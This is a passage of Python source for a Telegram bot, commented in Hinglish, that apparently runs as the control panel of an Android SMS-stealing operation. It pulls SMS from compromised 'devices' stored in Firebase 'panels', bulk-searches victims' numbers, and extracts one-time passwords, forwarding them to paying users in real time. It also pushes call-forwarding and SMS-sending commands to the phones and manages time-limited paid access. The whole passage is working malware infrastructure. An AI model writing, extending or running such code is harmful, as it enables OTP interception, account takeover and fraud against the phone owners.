                await update.message.reply_text("🎯 Matched Targets:", reply_markup=InlineKeyboardMarkup(rows))
            else:
                await update.message.reply_text("❌ Yeh number kisi bhi database mein nahi mila.")
            return

        if action == "bulk_search_pipe":
            if not has_access(chat_id):
                await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return
            raw_queries = re.split(r"[\n,;\s]+", text.strip())
            queries = [re.sub(r"\D", "", q) for q in raw_queries if len(re.sub(r"\D", "", q)) >= 8]
            queries = list(dict.fromkeys(queries))  # remove duplicates, keep order

            if not queries:
                await update.message.reply_text("❌ Koi valid number nahi mila (min 8 digits chahiye).")
                return

            devices = await get_all_devices(is_admin)
            # Pre-build device number index for fast lookup
            device_num_index = {}
            for d in devices:
                for num in d.numbers:
                    clean = re.sub(r"\D", "", num)
                    if clean not in device_num_index:
                        device_num_index[clean] = []
                    device_num_index[clean].append(d)

            wait_msg = await update.message.reply_text(
                f"🔍 <b>{len(queries)}</b> numbers search ho rahe hain...\n⏳ Wait karein...",
                parse_mode="HTML"
            )

            results_found   = []
            results_missing = []

            for q in queries:
                matched = []
                for stored_num, devs in device_num_index.items():
                    if q in stored_num or stored_num in q:
                        for d in devs:
                            if d not in matched:
                                matched.append(d)
                if matched:
                    results_found.append((q, matched))
                else:
                    results_missing.append(q)

            try: await wait_msg.delete()
            except: pass

            total   = len(queries)
            found_c = len(results_found)
            miss_c  = len(results_missing)

            # ── Summary message ──────────────────────────────────────
            summary = (
                f"🎯 <b>Bulk Search Results</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"📋 Total searched : <b>{total}</b>\n"
                f"✅ Mila           : <b>{found_c}</b>\n"
                f"❌ Nahi Mila      : <b>{miss_c}</b>\n"
                f"━━━━━━━━━━━━━━━━━━"
            )

            # Show first 20 found as inline buttons
            rows = []
            for q, devs in results_found[:20]:
                d = devs[0]
                icon = "🟢" if d.status == "online" else "🔴"
                num_label = d.numbers[0] if d.numbers else d.name
                rows.append([premium_button(
                    f"{icon} {q} → [{d.db_tag}] {num_label}",
                    callback_data=f"sel:{d.id}"
                )])
            rows.append([premium_button("❌ Close", callback_data="close_msg")])
            await update.message.reply_text(summary, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")

            # ── Send full results as .txt file ────────────────────────
            import io
            file_lines = [
                f"=== BULK SEARCH RESULTS ===",
                f"Total: {total} | Mila: {found_c} | Nahi Mila: {miss_c}",
                f"{'='*40}",
                "",
                "✅ MILA (Found):",
            ]
            for q, devs in results_found:
                d = devs[0]
                status = "ONLINE" if d.status == "online" else "offline"
                num_label = d.numbers[0] if d.numbers else d.name
                file_lines.append(f"  {q}  →  [{d.db_tag}] {num_label}  ({status})")

            file_lines += ["", "❌ NAHI MILA (Not Found):"]
            for q in results_missing:
                file_lines.append(f"  {q}")

            file_bytes = "\n".join(file_lines).encode("utf-8")
            file_obj   = io.BytesIO(file_bytes)
            file_obj.name = "bulk_search_result.txt"
            await update.message.reply_document(
                document=file_obj,
                filename="bulk_search_result.txt",
                caption=f"📄 Full result — {found_c} mila, {miss_c} nahi mila",
            )
            return

        if action == "keyword_search_pipe":
            if not has_access(chat_id):
                await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return
            keyword = text.strip().lower()
            if not keyword:
                await update.message.reply_text("❌ Keyword empty hai. Dobara bhejein.")
                return

            esc_kw   = html_escape(keyword)
            wait_msg = await update.message.reply_text(
                f"🔎 Keyword <code>{esc_kw}</code> ka sample dhundh raha hoon...\n⏳ Ek second...",
                parse_mode="HTML"
            )

            # ── Step 1: Sample preview — fetch SMS from first 20 devices only ──
            devices = await get_all_devices(is_admin)
            devices_with_nums = [d for d in devices if d.numbers]
            preview_devices   = devices_with_nums[:20]

            kw_sem = asyncio.Semaphore(10)
            async def fetch_sms_safe(d):
                async with kw_sem:
                    return await get_device_sms(d, limit=SMS_LIMIT)

            preview_results = await asyncio.gather(
                *(fetch_sms_safe(d) for d in preview_devices), return_exceptions=True
            )

            # Find first SMS that CONTAINS the keyword (sample to show user)
            sample_sms  = None
            sample_dev  = None
            sample_body = ""
            for d, smss in zip(preview_devices, preview_results):
                if isinstance(smss, Exception) or not smss: continue
                for sms in smss:
                    body = (sms.get("body") or sms.get("message") or sms.get("text") or "")
                    if keyword in body.lower():
                        sample_sms  = sms
                        sample_dev  = d
                        sample_body = body
                        break
                if sample_sms: break

            try: await wait_msg.delete()
            except: pass

            if not sample_sms:
                # No matching SMS found in first 20 devices → still let user confirm to run full search
                preview_text = (
                    f"<b>Keyword Preview: <code>{esc_kw}</code></b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"⚠️ Pehle 20 devices mein yeh keyword kisi SMS mein nahi mila.\n\n"
                    f"Phir bhi <b>poora search</b> chalana chahte hain?\n"
                    f"━━━━━━━━━━━━━━━━━━"
                )
            else:
                num_lbl    = sample_dev.numbers[0] if sample_dev.numbers else sample_dev.name
                sender     = sample_sms.get("sender", "Unknown")
                dt         = sms_date(sample_sms)
                # Highlight keyword in body
                highlighted = sample_body.replace(keyword, f"【{keyword}】")[:300]
                preview_text = (
                    f"<b>Keyword Preview: <code>{esc_kw}</code></b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"Number : {html_escape(num_lbl)}\n"
                    f"From   : {html_escape(sender)}\n"
                    f"Date   : {dt}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"<b>Message:</b>\n{html_escape(highlighted)}{'...' if len(sample_body) > 300 else ''}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"✅ Kya yeh sahi match hai? Confirm karo tab poora search chalega."
                )

            # Store keyword for confirm step
            pending_kw_confirm[chat_id] = keyword

            confirm_kb = InlineKeyboardMarkup([
                [
                    premium_button("✅ Haan, Poora Search Karo", callback_data=f"kw_confirm:{chat_id}"),
                    premium_button("❌ Cancel", callback_data=f"kw_cancel:{chat_id}"),
                ]
            ])
            await update.message.reply_text(preview_text, reply_markup=confirm_kb, parse_mode="HTML")
            return

        if action == "execute_cf":
            dev_id = act_data["dev_id"]
            devices = await get_all_devices(is_admin)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: return
            ok = await write_call_forward(device, text)
            await update.message.reply_text("✅ Call forward pushed!" if ok else "❌ Command failed.")
            return

        if action == "execute_ss":
            dev_id = act_data["dev_id"]
            devices = await get_all_devices(is_admin)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: return
            try:
                to_n, body_m = text.split(":", 1)
                ok = await write_send_sms(device, to_n.strip(), body_m.strip())
                await update.message.reply_text("✅ SMS sent!" if ok else "❌ Failed.")
            except:
                await update.message.reply_text("❌ Invalid format. Use: TARGET_NUMBER:MESSAGE")
            return

        if action == "add_bulk_db" and is_admin:
            await handle_bulk_panel_import(update, ctx, text, source_label="message")
            return

        if action == "grant_access_pipe" and is_admin:
            days = 0
            raw_txt = (text or "").strip()
            if "|" in raw_txt:
                left, right = raw_txt.split("|", 1)
                raw_txt = left.strip()
                try:
                    days = max(0, int(right.strip()))
                except Exception:
                    days = 0
            target_id = await _resolve_user_arg(ctx, raw_txt)
            if target_id is None:
                await update.message.reply_text(
                    "❌ User nahi mila. Numeric User ID ya @username bhejein.\n"
                    "Dobara try karein (cancel: /cancel)"
                )
                pending_action[chat_id] = act_data
                return
            grant_access(target_id, days=days)
            udata = all_users.get(target_id, {})
            name = udata.get("name", "Unknown")
            exp = int((all_users.get(target_id) or {}).get("access_expires_at", 0) or 0)
            exp_line = ("never" if not exp else datetime.fromtimestamp(exp).strftime("%d %b %Y %I:%M %p"))
            await update.message.reply_text(
                f"✅ Access granted to {name} ({target_id})\n⏳ Expiry: <b>{exp_line}</b>",
                parse_mode="HTML",
            )
            try:
                await send_private_log(
                    ctx.bot,
                    f"🔓 <b>ACCESS GRANTED</b>\n━━━━━━━━━━━━━━━━━━\n"
                    f"Target: {html_escape(str(name))} | <code>{target_id}</code>\n"
                    f"By admin: <code>{chat_id}</code>\n"
                    f"Expiry: <code>{exp_line}</code>\n"
                    f"Time: <code>{datetime.now().strftime('%d %b %Y %I:%M:%S %p')}</code>",
                )
            except Exception:
                pass
            try:
                await ctx.bot.send_message(
                    target_id,
                    "✅ <b>Access Granted!</b>\n\nAapko bot use karne ki ijazat mil gayi.\n/start karein.",
                    parse_mode="HTML"
                )
            except: pass
            return

        if action == "revoke_access_pipe" and is_admin:
            target_id = await _resolve_user_arg(ctx, text)
            if target_id is None:
                await update.message.reply_text(
                    "❌ User nahi mila. Numeric User ID ya @username bhejein.\n"
                    "Dobara try karein (cancel: /cancel)"
                )
                pending_action[chat_id] = act_data
                return
            revoke_access(target_id)
            await update.message.reply_text(f"❌ Access revoked for user {target_id}")
            return

        if action == "broadcast_msg" and is_admin:
            # Handled by on_broadcast_capture (group -1) so that premium emoji,
            # inline buttons and media are copied exactly.
            pending_action[chat_id] = {"action": "broadcast_msg"}
            await update.message.reply_text(
                "\u26a0\ufe0f Broadcast capture handler ne ye message nahi pakda. Dobara bhejein."
            )
            return

        # ── CATCH-ALL for input pipelines ───────────────────────────────────
        # Agar action ka koi handler nahi mila to pehle bot chup ho jata tha.
        # Ab saaf jawab + panel wapas.
        if is_admin:
            await update.message.reply_text(
                f"{premium_emoji()} <b>Ye input samajh nahi aaya.</b>\n"
                f"Action: <code>{html_escape(str(action))}</code>\n\n"
                f"Panel dobara kholne ke liye /start bhejein.",
                parse_mode="HTML",
                reply_markup=admin_keyboard(),
            )
        else:
            await update.message.reply_text(
                "❌ Ye input process nahi ho saka. /start bhejein.",
            )
        return

    if text not in ("⌬ Admin Panel", "◌ Bot Status") and not is_admin:
        if not has_access(chat_id):
            await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML")
            return

    if text in ("✦ Devices List", "Devices List", "📱 Devices"):
        devices = await get_all_devices(is_admin)
        pg = user_page.get(chat_id, 0)
        await update.message.reply_text(
            device_list_header(devices, pg),
            reply_markup=device_list_keyboard(devices, pg),
            parse_mode="HTML"
        )
        return

    if text in ("▣ All Panels", "All Panels", "📡 All Panels"):
        visible_tags = [t for t in DATABASES if is_admin or t not in ADMIN_ONLY_TAGS]
        total_panels = len(visible_tags)
        total_devs = sum(len(GLOBAL_DEVICE_CACHE.get(t, [])) for t in visible_tags)
        grand_online = sum(
            sum(1 for d in GLOBAL_DEVICE_CACHE.get(t, []) if d.status == "online")
            for t in visible_tags
        )
        header = (f"{premium_emoji()} <b>ALL PANELS</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"📡 Panels: {total_panels}  |  📱 Devices: {total_devs}\n"
                  f"🟢 Online: {grand_online}  🔴 Offline: {total_devs - grand_online}\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"Panel pe click karo → us panel ke numbers dikhenge:")
        await update.message.reply_text(header, reply_markup=panels_list_keyboard(is_admin=is_admin), parse_mode="HTML")
        return

    if text in ("⌕ Search Number", "Search Number", "🔍 Search"):
        pending_action[chat_id] = {"action": "search_num_pipe"}
        await update.message.reply_text("🔍 Search karne ke liye number ya text bhejien:")
        return

    if text in ("⌁ Keyword Search", "Keyword Search", "🔤 Keyword"):
        pending_action[chat_id] = {"action": "keyword_search_pipe"}
        await update.message.reply_text(
            "🔎 <b>Keyword Search</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Woh keyword/text bhejein jo check karna hai.\n\n"
            "Bot saare numbers ke latest SMS check karega.\n"
            "Jis number ke SMS mein keyword <b>NAHI</b> hoga woh screen pe dikhega.\n"
            "Jis number ka koi SMS hi nahi — use skip kar dega.\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )
        return

    if text in ("🔍 Bulk Search", "Bulk Search", "🔎 Bulk Search"):
        if not is_admin:
            await update.message.reply_text("🚫 Ye feature admin-only hai.", parse_mode="HTML")
            return
        header = (
            "🔍 <b>BULK SEARCH — Panel Selector</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Panel select karo — sirf wahi numbers milenge jo:\n"
            "🟢 Online hain\n"
            "📅 Aaj / kal / parson OTP aaya ho\n"
            "━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(header, reply_markup=bulksearch_panels_keyboard(), parse_mode="HTML")
        return

    # 🆔 AUTO: admin ne koi message FORWARD kiya (bina button dabaye) →
    # seedha Chat ID card. Private channel ka ID nikalne ka fastest tareeka.
    if is_admin:
        _origin = getattr(update.message, "forward_origin", None)
        _fwd = getattr(_origin, "chat", None) or getattr(_origin, "sender_chat", None)
        if _fwd is not None:
            info = await _resolve_chat_info(ctx.bot, _fwd.id)
            if not info.get("ok"):
                info.update(ok=True, chat_id=_fwd.id,
                            title=getattr(_fwd, "title", "—"),
                            type=getattr(_fwd, "type", "—"),
                            username=getattr(_fwd, "username", None),
                            bot_status="not_member", can_post=False)
            await update.message.reply_text(
                _chatid_card(info), parse_mode="HTML",
                reply_markup=chatid_keyboard(info))
            return

    if text in ("№ Number Search", "Number Search"):
        pending_action[chat_id] = {"action": "bulk_search_pipe"}
        await update.message.reply_text(
            "📋 <b>Bulk Number Search</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Ek ya zyada numbers bhejein (enter, comma, ya space se alag):\n\n"
            "<i>Example:</i>\n"
            "<code>9876543210\n9123456789\n8800001234</code>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Bot sabhi panels mein search karega.",
            parse_mode="HTML"
        )
        return

    if text in ("◉ Panel Status", "Panel Status", "📊 Panel Status"):
        lines = ["📊 <b>Panel Status</b>", "━━━━━━━━━━━━━━━━━━"]
        grand_total = grand_online = 0
        for tag in sorted(DATABASES.keys()):
            if not is_admin and tag in ADMIN_ONLY_TAGS: continue
            cached = GLOBAL_DEVICE_CACHE.get(tag, [])
            total  = len(cached)
            online = sum(1 for d in cached if d.status == "online")
            grand_total  += total
            grand_online += online
            bar = "🟢" if online > 0 else ("🔴" if total > 0 else "⚫")
            num_count = sum(len(d.numbers) for d in cached if d.numbers)
            lines.append(f"{bar} <b>{tag}</b> — Total: <code>{total}</code> | Online: <code>{online}</code> | Numbers: <code>{num_count}</code>")
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append(f"📱 <b>Grand Total:</b> <code>{grand_total}</code> devices")
        lines.append(f"🟢 <b>Online:</b> <code>{grand_online}</code>  🔴 <b>Offline:</b> <code>{grand_total - grand_online}</code>")
        # ⚠️ Telegram 4096-char limit — 144 panels ek saath bhejne par
        # "Message is too long" aata tha. Yahan safe truncation.
        full = "\n".join(lines)
        if len(full) > 3800:
            keep, used = [], 0
            for ln in lines:
                if used + len(ln) + 1 > 3600:
                    break
                keep.append(ln)
                used += len(ln) + 1
            hidden = len(lines) - len(keep)
            keep.append("━━━━━━━━━━━━━━━━━━")
            keep.append(f"⚠️ <i>… aur {hidden} lines chhupayi gayi (message limit).</i>")
            keep.append("💡 Poori list ke liye <b>All Panels</b> button dabao (paginated).")
            full = "\n".join(keep)
        await update.message.reply_text(full, parse_mode="HTML")
        return

    if text in ("◇ Recent OTPs", "Recent OTPs", "🔑 Recent OTPs"):
        devices = await get_all_devices(is_admin)
        out_msg = "📋 Recent OTPs (Latest per Number):\n━━━━━━━━━━━━━━━━━━\n"

        def sms_ts(sm: dict) -> float:
            try:
                ts = float(sm.get("timestamp", 0))
                return ts / 1000 if ts > 1e11 else ts
            except: return 0.0

        devices = [d for d in devices if d.numbers]
        best: dict[str, tuple] = {}
        sms_tasks = await asyncio.gather(*(get_device_sms(d, limit=10) for d in devices))
        for d, smss in zip(devices, sms_tasks):
            num_label = d.numbers[0] if d.numbers else d.id[:10]
            for sm in smss:
                body = sm.get("body") or sm.get("message") or sm.get("text") or ""
                found = extract_otp(body)
                if not found: continue
                ts = sms_ts(sm)
                existing = best.get(num_label)
                if not existing or ts > existing[2]:
                    best[num_label] = (found, sm, ts)

        if not best: out_msg += "📭 Koi fresh OTP nahi mila."
        else:
            sorted_best = sorted(best.items(), key=lambda x: x[1][2], reverse=True)
            for num_label, (otp, sm, _) in sorted_best[:25]:
                out_msg += f"🔑 <code>{escape(str(otp))}</code> | {escape(str(num_label))} | {escape(str(sms_date(sm)))}\n"
        await update.message.reply_text(out_msg, parse_mode="HTML")
        return


    if text in ("◌ Bot Status", "🤖 Bot Status") and is_admin:
        status_text = (f"◌ Bot Status\n━━━━━━━━━━━━━━━━━━\n"
                       f"🛰 Poll: <code>{POLL_INTERVAL}s</code>\n📦 SMS Limit: <code>{SMS_LIMIT}</code>\n"
                       f"⚡️ DBs: <code>{len(DATABASES)}</code>\n"
                       f"✅ Allowed Users: <code>{len(allowed_users)}</code>\n"
                       f"━━━━━━━━━━━━━━━━━━\n")
        total_nums = 0
        for tag in sorted(DATABASES.keys()):
            cached = GLOBAL_DEVICE_CACHE.get(tag, [])
            cnt = sum(len(d.numbers) for d in cached if d.numbers)
            total_nums += cnt
            status_text += f"{'🟢' if cnt > 0 else '🔴'} <b>{escape(str(tag))}:</b> <code>{cnt}</code> numbers\n"
        status_text += f"\n🎯 <b>Total:</b> <code>{total_nums}</code> numbers"
        await update.message.reply_text(status_text, parse_mode="HTML")
        return

    if text in ("⌬ Admin Panel", "Admin Panel", "⚙️ Admin Panel") and is_admin:
        await update.message.reply_text(admin_panel_text(), reply_markup=admin_keyboard(), parse_mode="HTML")
        return

    # ── FINAL FALLBACK — bot kabhi chup nahi rahega ─────────────────────────
    # Agar pending_action kho gaya (bot restart / /start / pehla attempt fail)
    # ya text kisi bhi option se match nahi hua, to yahan hamesha jawab jata hai.
    # SAFETY NET: admin ka text channel/ID jaisa dikhe to one-click quick action
    # de do — pending ke bina bhi kaam ho jayega.
    try:
        if is_admin:
            quick_rows = []
            m_ch = re.fullmatch(
                r"(?:https?://)?(?:www\.)?(?:t|telegram)\.me/([A-Za-z][A-Za-z0-9_]{3,})/?",
                text.strip(),
            ) or re.fullmatch(r"@?([A-Za-z][A-Za-z0-9_]{3,})", text.strip())
            if m_ch:
                ch = "@" + m_ch.group(1)
                if ch in {str(c.get("channel", "")).strip() for c in FORCE_JOIN_CHANNELS if isinstance(c, dict)}:
                    await update.message.reply_text(
                        f"ℹ️ <b>{html_escape(ch)} already Force Join me added hai!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"Total channels: <b>{len(FORCE_JOIN_CHANNELS)}</b>\n"
                        f"Force Join: <b>{'ON 🟢' if FORCE_JOIN_ENABLED else 'OFF 🔴'}</b>",
                        parse_mode="HTML",
                        reply_markup=admin_force_join_keyboard(),
                    )
                    return
                quick_rows.append([premium_button(
                    f"➕ {ch} ko Force Join me ADD karo",
                    callback_data=f"fjq:{ch}", style="success")])
            elif re.fullmatch(r"-100\d{6,}", text.strip()):
                quick_rows.append([premium_button(
                    f"➕ {text.strip()} ko Force Join me ADD karo",
                    callback_data=f"fjq:{text.strip()}", style="success")])
            elif re.fullmatch(r"\d{5,15}", text.strip()):
                quick_rows.append([premium_button(
                    f"✅ {text.strip()} ko ACCESS do",
                    callback_data=f"gaq:{text.strip()}", style="success")])
            if quick_rows:
                quick_rows.append([premium_button("❌ Ignore", callback_data="close_msg", style="danger")])
                await update.message.reply_text(
                    f"{premium_emoji()} <b>Pending action expire ho gaya tha</b> — lekin maine samajh liya. 👇\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    "Ek click me seedha kaam kar dein?",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(quick_rows),
                )
                return
            await update.message.reply_text(
                f"{premium_emoji()} <b>Ye message kisi option se match nahi hua.</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "Agar aap koi detail bhej rahe the (channel username / user ID / URL), "
                "to pehle us option ka <b>button dobara dabayein</b>, phir detail bhejein.\n\n"
                "Panel kholne ke liye /start",
                parse_mode="HTML",
                reply_markup=admin_keyboard(),
            )
        else:
            await update.message.reply_text(
                "❓ Ye message samajh nahi aaya.\nPanel ke liye /start bhejein."
            )
    except Exception as _fe:
        _log(f"final fallback error: {type(_fe).__name__}: {_fe}")


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Crash-proof wrapper: koi bhi exception ho to user ko batayein aur
    pending action wapas set karein taake dobara try kar sakein."""
    # F2: session tracker
    if update.effective_user:
        session_start(update.effective_user.id)
    chat_id = update.effective_chat.id
    snapshot = dict(pending_action.get(chat_id) or {})
    try:
        await _on_text_impl(update, ctx)
    except Exception as e:
        _log(f"on_text CRASH chat={chat_id} action={snapshot.get('action')}: {type(e).__name__}: {e}")
        import traceback as _tb
        _tb.print_exc()
        if snapshot:
            pending_action[chat_id] = snapshot
        try:
            await update.message.reply_text(
                f"⚠️ <b>Error aaya</b>\n"
                f"<code>{html_escape(str(e))[:300]}</code>\n\n"
                f"Dobara try karein — panel: /start",
                parse_mode="HTML",
            )
        except Exception:
            pass

# ═══════════════════════════════════════════════════════
#  /STATUS COMMAND
# ═══════════════════════════════════════════════════════

_bot_start_time: float = time.time()

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only."); return

    await update.message.reply_text("🔄 Checking DB health...")

    async def ping_db(tag: str, url: str) -> dict:
        start = time.time()
        try:
            session = await _get_session()
            async with session.get(f"{url}/.json?shallow=true", timeout=aiohttp.ClientTimeout(total=3)) as r:
                latency = int((time.time() - start) * 1000)
                cached = GLOBAL_DEVICE_CACHE.get(tag, [])
                alive = r.status == 200
                try:
                    record_panel_health(tag, alive, latency)
                except Exception:
                    pass
                return {"tag": tag, "alive": alive, "latency": latency,
                        "total": len(cached), "online": sum(1 for d in cached if d.status == "online")}
        except:
            try:
                record_panel_health(tag, False, -1)
            except Exception:
                pass
            return {"tag": tag, "alive": False, "latency": -1, "total": 0, "online": 0}

    results = await asyncio.gather(*(ping_db(tag, url) for tag, url in DATABASES.items()))
    uptime_sec = int(time.time() - _bot_start_time)
    h, rem = divmod(uptime_sec, 3600); m, s = divmod(rem, 60)
    lines = [
        "📊 <b>BOT STATUS</b>", "━━━━━━━━━━━━━━━━━━",
        f"⏱ Uptime: <code>{h}h {m}m {s}s</code>",
        f"🗄 DBs Alive: <code>{sum(1 for r in results if r['alive'])}/{len(results)}</code>",
        f"📱 Total Devices: <code>{sum(r['total'] for r in results)}</code>",
        f"🟢 Online: <code>{sum(r['online'] for r in results)}</code>",
        f"✅ Allowed Users: <code>{len(allowed_users)}</code>",
        "━━━━━━━━━━━━━━━━━━", "<b>DB Health:</b>",
    ]
    for r in sorted(results, key=lambda x: x["tag"]):
        lat = f"{r['latency']}ms" if r["latency"] >= 0 else "timeout"
        lines.append(f"{'🟢' if r['alive'] else '🔴'} <b>{r['tag']}</b> {lat} | {r['total']} devices | {r['online']} online")
    lines.append("━━━━━━━━━━━━━━━━━━")
    try: await update.message.reply_text("\n".join(lines), parse_mode="HTML")
    except: await update.message.reply_text("❌ Status error.")

# ══════════════════════════════════════════════════════════════
#  EXTRA PREMIUM COMMANDS: /id /ping /menu /panel /help
# ══════════════════════════════════════════════════════════════

async def cmd_id(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Show user's Telegram ID with a one-tap copy button."""
    chat_id = update.effective_chat.id
    user = update.effective_user
    is_admin = maybe_promote_admin(user) or (chat_id in ADMIN_IDS)
    role = "👑 OWNER / ADMIN" if is_admin else "👤 USER"
    await update.message.reply_text(
        f"{premium_emoji()} <b>YOUR TELEGRAM ID</b>\n"
        + "━" * 18 + "\n"
        f"🆔 <code>{chat_id}</code>\n"
        f"👤 Name : <b>{html_escape(user.full_name if user else 'Unknown')}</b>\n"
        f"🔗 Username : @{html_escape((user.username if user else '') or 'none')}\n"
        f"🎖 Role : <b>{role}</b>\n"
        + "━" * 18 + "\n"
        "<i>Neeche button dabao — ID clipboard me copy ho jayegi.</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[
            premium_button("Copy My ID", copy_text=str(chat_id), style="success")
        ]]),
    )


async def cmd_ping(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Latency / alive check."""
    t0 = time.time()
    msg = await update.message.reply_text("🏓 Pinging…")
    ms = int((time.time() - t0) * 1000)
    uptime_sec = int(time.time() - _bot_start_time)
    h, rem = divmod(uptime_sec, 3600)
    m, s = divmod(rem, 60)
    try:
        await msg.edit_text(
            f"{premium_emoji()} <b>PONG</b>\n" + "━" * 18 + "\n"
            f"⚡ Latency : <code>{ms} ms</code>\n"
            f"⏱ Uptime  : <code>{h}h {m}m {s}s</code>\n"
            f"📡 Panels  : <code>{len(DATABASES)}</code>\n"
            f"👥 Users   : <code>{len(all_users)}</code>",
            parse_mode="HTML",
        )
    except Exception:
        pass


async def cmd_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Re-open the main reply menu."""
    chat_id = update.effective_chat.id
    is_admin = maybe_promote_admin(update.effective_user) or (chat_id in ADMIN_IDS)
    await update.message.reply_text(
        f"{premium_emoji()} <b>MAIN MENU</b>\n" + "━" * 18 +
        "\n<i>Neeche keyboard se option choose karein 👇</i>",
        parse_mode="HTML",
        reply_markup=get_reply_menu(is_admin),
    )


async def cmd_panel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Open the admin panel directly (admin only)."""
    chat_id = update.effective_chat.id
    if not (maybe_promote_admin(update.effective_user) or chat_id in ADMIN_IDS):
        await update.message.reply_text("🚫 Admin only.")
        return
    await update.message.reply_text(
        admin_panel_text(), parse_mode="HTML", reply_markup=admin_keyboard()
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    is_admin = maybe_promote_admin(update.effective_user) or (chat_id in ADMIN_IDS)
    extra = "\n👑 /panel — admin panel\n👑 /status — DB health\n👑 /grant, /revoke — access" if is_admin else ""
    await update.message.reply_text(
        f"{premium_emoji()} <b>COMMANDS</b>\n" + "━" * 18 + "\n"
        "🚀 /start — main menu\n"
        "🆔 /id — your ID + copy button\n"
        "🏓 /ping — latency check\n"
        "📋 /menu — keyboard menu\n"
        "❓ /help — this list" + extra,
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════
#  REALTIME POLLING ENGINE
# ═══════════════════════════════════════════════════════

async def _forward_otp_only(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return

    # F5: SMS keyword filter
    if not sms_passes_filter(body):
        return

    otp = extract_otp(body)
    if not otp: return

    # ── OTP Logger: extract phone from sender field ──
    phone_raw = str(sms.get("address") or sms.get("sender") or sms.get("from") or "unknown")

    msg_text = auto_forward_msg(sms, device_label(device))
    rows = [
        # ⚡ TAP-TO-COPY: ek tap me OTP clipboard me
        [premium_button(f"Copy OTP  {otp}", copy_text=str(otp), style="success"),
         premium_button("Copy Number", copy_text=device_label(device), style="primary")],
        [premium_button("View Last 10 SMS", callback_data=f"msgs:{device.id}"),
         premium_button("Info", callback_data=f"info:{device.id}")],
    ]
    markup = InlineKeyboardMarkup(rows)

    if not _main_app: return

    is_admin_device = device.db_tag in ADMIN_ONLY_TAGS
    focused_users = [cid for cid, dev_id in user_focus.items() if dev_id == device.id]

    # ── Log OTP sent event ──
    if focused_users and LOG_CHANNEL_ID:
        try:
            await log_otp_activity(
                bot=_main_app.bot,
                event="sent",
                user_id=focused_users[0],
                phone=phone_raw,
                panel_name=device.db_tag,
                db_name=getattr(device, "base_url", "")[:60],
                success=True,
                extra={"otp_len": len(otp), "device_id": device.id},
            )
        except Exception:
            pass

    for cid in focused_users:
        if all_users.get(cid, {}).get("banned"): continue
        # ── Auto-blacklist check ──
        if cid in _logger_blacklist:
            continue
        if not has_access(cid): continue
        if is_admin_device and cid not in ADMIN_IDS: continue
        try:
            # F1: watermark per user
            msg_with_wm = otp_message_watermarked(msg_text, cid)
            # F2: session tick
            session_otp_tick(cid)
            sent_msg = await _main_app.bot.send_message(
                cid, msg_with_wm, reply_markup=markup, parse_mode="HTML",
                read_timeout=5, write_timeout=5
            )
            # F5: receipt tick
            otp_receipt_tick(cid)
            # F11: register countdown
            register_otp_countdown(
                bot=_main_app.bot,
                chat_id=cid,
                msg_id=sent_msg.message_id,
                base_text=msg_with_wm,
                markup=markup,
            )
        except: pass

async def seed_seen_ids_for_db(url: str) -> None:
    try:
        r_main, r_user = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url))
        for bulk_data in (r_main, r_user):
            if isinstance(bulk_data, dict):
                for dev_id, sms_dict in bulk_data.items():
                    if isinstance(sms_dict, dict):
                        for k in sms_dict: seen_ids.add(seen_key(dev_id, k))
    except Exception: pass

async def poll_single_db(tag: str, url: str) -> None:
    try:
        r_main, r_user = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url))
        device_map = {d.id: d for d in GLOBAL_DEVICE_CACHE.get(tag, [])}
        for bulk_data in (r_main, r_user):
            if isinstance(bulk_data, dict):
                for dev_id, sms_dict in bulk_data.items():
                    if isinstance(sms_dict, dict) and dev_id in device_map:
                        for k in sms_dict:
                            skey = seen_key(dev_id, k)
                            if skey not in seen_ids:
                                seen_ids.add(skey)
                                if not first_run:
                                    await _forward_otp_only(device_map[dev_id], sms_dict[k])
    except Exception as _poll_err:
        # ── Firebase poll error logger ──
        if _main_app and LOG_CHANNEL_ID:
            try:
                await log_firebase_error(
                    bot=_main_app.bot,
                    error=_poll_err,
                    context=f"poll_single_db:{tag}",
                    extra={"db_url": url[:80]},
                    critical=False,
                )
            except Exception:
                pass

async def poll_loop(app: Application) -> None:
    global first_run, _main_app, seen_ids
    _main_app = app
    gc_counter = 0
